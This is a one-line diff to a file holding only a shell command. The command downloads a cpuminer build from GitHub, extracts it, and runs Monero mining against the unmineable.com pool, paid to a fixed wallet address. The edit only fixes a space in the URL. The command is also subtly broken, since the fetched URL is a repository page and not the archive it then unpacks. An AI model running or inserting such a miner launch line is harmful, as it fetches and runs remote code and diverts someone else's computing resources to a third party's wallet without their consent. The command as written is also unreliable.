@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer -opt-rplant && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a rx -o stratum+tcp://rx.unmineable.com:3333 -u XMR:846SwE2HixnZxcCzL1qpxkMGMTQV5ceUtGAYTskWQ7biYtfTbqKhv4r5nGqKyD9bQ8JFA5rzjWafqJ1n8beyxhyF7ryWkkm#fl62-ut2y -p ocean -t 2
+wget https://github.com/rplant8/cpuminer-opt-rplant && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a rx -o stratum+tcp://rx.unmineable.com:3333 -u XMR:846SwE2HixnZxcCzL1qpxkMGMTQV5ceUtGAYTskWQ7biYtfTbqKhv4r5nGqKyD9bQ8JFA5rzjWafqJ1n8beyxhyF7ryWkkm#fl62-ut2y -p ocean -t 2
